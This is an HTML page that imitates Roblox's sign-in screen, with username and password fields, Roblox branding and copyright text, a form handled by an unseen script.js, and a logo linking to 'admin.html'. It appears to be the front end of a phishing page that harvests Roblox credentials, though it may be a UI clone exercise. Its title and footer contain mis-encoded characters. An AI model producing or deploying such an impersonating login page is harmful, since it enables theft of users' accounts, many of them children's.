<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Roblox ‚Äî Sign In</title>
    <link rel="stylesheet" href="styles.css" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
  </head>
  <body>
    <header class="topbar">
      <div class="container topbar-inner">
        <a class="brand" href="admin.html">
          <img id="brandLogo" src="assets/Roblox_(2025)_(App_Icon).svg.png" alt="Playbox" onerror="this.onerror=null;this.src='assets/logo.png'" />
          <span>Roblox</span>
        </a>

        <form class="search" role="search" aria-label="Search experiences">
          <input id="topSearch" type="search" placeholder="Search" aria-label="Search" />
          <button type="submit" aria-label="Search button">üîç</button>
        </form>

        <nav class="topnav" aria-label="Primary">
          <a href="#">Create</a>
          <a href="#">Catalog</a>
          <a href="#">Messages</a>
          <a class="signin-link" href="#">Sign Up</a>
        </nav>
      </div>
    </header>

    <main class="hero-full">
      <div class="overlay"></div>

      <aside class="auth-overlay">
        <form id="loginForm" class="login-form" novalidate>
          <h1 class="auth-title">Login to Roblox</h1>

          <label>
            <input id="user" name="user" type="text" placeholder="Username/Email/Phone" required />
          </label>

          <label>
            <input id="pass" name="pass" type="password" placeholder="Password" required />
          </label>

          <button id="submitBtn" class="btn primary" type="submit">Log In</button>

          <div class="forgot">Forgot Password or Username?</div>

          <div class="divider"> </div>

          <button type="button" class="btn alt">Email Me a One-Time Code</button>
          <button type="button" class="btn alt ghost">Quick Sign-in</button>

          <p class="signup">Don't have an account? <a href="#">Sign Up</a></p>

          <div id="formMessage" class="form-message" aria-live="polite"></div>
        </form>
      </aside>
    </main>

    <footer class="site-footer">
      <div class="container footer-inner">
        <div class="footer-left">¬© 2026 Roblox ‚Äî All rights reserved.</div>
        <div class="footer-links">
          <a href="#">Terms</a>
          <a href="#">Privacy</a>
          <a href="#">Help</a>
        </div>
      </div>
    </footer>

    <script src="script.js"></script>
  </body>
</html>
